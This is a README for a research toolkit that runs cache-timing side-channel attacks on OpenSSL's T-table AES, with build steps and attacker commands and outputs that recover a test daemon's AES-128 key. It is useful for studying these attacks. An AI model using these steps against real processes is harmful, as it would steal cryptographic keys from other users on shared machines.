# CSCA (Crypto Side Channel Attack)

- CSCA (Crypto Side Channel Attack) toolkit
- AES one round attack, AES last round attack

## Which attacks do CSCA implement?

- aes one round attack to get 64bit of AES-128 key
- aes last round attack to get full AES-128 key
- Should be added more!

## Internal of CSCA attacks

- All attacks have implemented by refering several papers. [1], [2]
- All attacks are cache-based side channel attack.
- If you are interested in details how crypto attacks work, Please see papers [1], [2].
- If you are interested in details how cache measurement work, Please see papers [4], [5].

## Does it really work?

- Yes! Since this is cache based side channel attack, You can easily test this on Linux distros.
- The main goal of CSCA is to implement crypto side channel attacks which can be fully working on PC without additional efforts.
- Please see "How to build", "How to run" sections.

## libflush

- CSCA leverage libflush library [3] to perform various cache maintenance operations.
- CSCA use Flush+Reload [4] technique for cache measurement. It's best solution ever for cache measurement.

## Target crypto library

- As for now, attacks on openssl have implemented only. (4kb AES T-table implementation)
- CSCA attacks can be easily ported to other crypto library.
- last-round-attack, one-round-attack are implemented as a library, So that It makes porting to other crypto library easier.

## Target application, environment

- CSCA doesn't attack real application. I made some applications, and an environment to test CSCA attacks.
- But, you can try to attack real application with CSCA libraries for last round attack, one round attack.
- security_daemon :  Daemon which provides encryption service. It has hard-coded crypto key which is not visible to other process.
- attacker :  Attacker which perform attacks with attack library (last round attack, one round attack)
- attacker and security_daemon are different process, but they can communicate via IPC.
- attacker sends plain text to security_daemon, and security_daemon encrypts it with crypto key, and return encrypted text.
- attacker repeats above encryption process, and predict what real key value is.

## Directories

- lib/ :  various libraries which CSCA uses
- lib/last_round_attack/  :  core library for AES last round attack
- lib/one_round_attack/  : core library for AES one round attack
- lib/libflush/  :  libflush library
- lib/openssl-1.0.2/   : openssl library
- aes-attack/last-round-attack/  :  attacker and security daemon to test last round attack, The attacker use above last round attack library.
- aes-attack/one-round-attack/   :  attacker and security daemon to test one round attack, The attacker use above one round attack library.

## How to build (on Linux distros such as Ubuntu)
	```
	$ ./build_x86_64.sh
	```

## How to run one-round-attack

* Get T-table offset from crypto library
	```
	$ cd build/aes-attack/one-round-attack/real-security-daemon
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep Te0   ==> 000000000016be40 r Te0
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep Te1   ==> 000000000016ba40 r Te1
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep Te2   ==> 000000000016b640 r Te2
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep Te3   ==> 000000000016b240 r Te3
	  These offsets should be used as input for attacker.
	```

* Run security daemon
	```
	$ cd build/aes-attack/one-round-attack/real-security-daemon
	$ LD_PRELOAD=../../../lib/libcrypto.so.1.0.0 ./security_daemon &
	  security_daemon is running...
	  real key : a2981898c47187538cde1709dbd9ab40
	```

* Run attack
	```
	$ cd build/aes-attack/one-round-attack/real-security-daemon
	$ ./attacker 600 1 250 0016be40 0016ba40 0016b640 0016b240 ../../../lib/libcrypto.so.1.0.0
	  security_daemon_connect success
	  plain_text_cnt : 600
	  calculating all subsets...
	  progress : 4096 / 2457600
	  (.... repeat ....)
	  predict key : a0901090c070805080d01000d0d0a040  ==> final result of attack
	  ....
	  real key : a2981898c47187538cde1709dbd9ab40
	  predict key : a0901090c070805080d01000d0d0a040
	  Recover [64] bits success!!  ==> How many bits are predicted correctly
	```

## How to run last-round-attack

* Get T-table, rcon offset from crypto library
	```
	$ cd build/aes-attack/last-round-attack/real-security-daemon
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep Te0   ==> 000000000016be40 r Te0
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep Te1   ==> 000000000016ba40 r Te1
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep Te2   ==> 000000000016b640 r Te2
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep Te3   ==> 000000000016b240 r Te3
	$ nm ../../../lib/libcrypto.so.1.0.0 | grep rcon  ==> 000000000016a100 r rcon
	  These offsets should be used as input for attacker.
	```

* Run security daemon
	```
	$ cd build/aes-attack/last-round-attack/real-security-daemon
	$ LD_PRELOAD=../../../lib/libcrypto.so.1.0.0 ./security_daemon &
	  security_daemon is running...
	  real key : a2981898c47187538cde1709dbd9ab40
	```

* Run attack
	```
	$ cd build/aes-attack/last-round-attack/real-security-daemon
	$ ./attacker 600 250 0016be40 0016ba40 0016b640 0016b240 0016a100 ../../../lib/libcrypto.so.1.0.0
	  security_daemon_connect success
	  plain_text_cnt : 600
	  progress : 0 / 600
	  (.... repeat ....)
	  predict last round key : 9886c881cad8676e0f01eb4a30df89f5   ==> get last round key via last-round-attack
	  invert round key!!  ==> invert from last round to first round key (real key)
	  ....
	  real key : a2981898c47187538cde1709dbd9ab40
	  predict key : a2981898c47187538cde1709dbd9ab40
	  Recover [16] byte success!!  ==> How many bytes are predicted correctly
	```

## Tested machine

- PC, 4.4.0-62-generic #83-Ubuntu (Ubuntu 16.04), x86_64
- Raspberry pi3, Cortex-A53, ARMv8

## Contact

- Jinbum Park <jinb.park7@gmail.com>

## References

- [1] Cache Attacks and Countermeasures: the Case of AES (https://www.cs.tau.ac.il/~tromer/papers/cache.pdf)
- [2] Wait a minute! A fast, Cross-VM attack on AES (https://eprint.iacr.org/2014/435.pdf)
- [3] libflush (https://github.com/IAIK/armageddon/tree/master/libflush)
- [4] FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack (https://eprint.iacr.org/2013/448.pdf)
- [5] ARMageddon: Cache Attacks on Mobile Devices (https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_lipp.pdf)


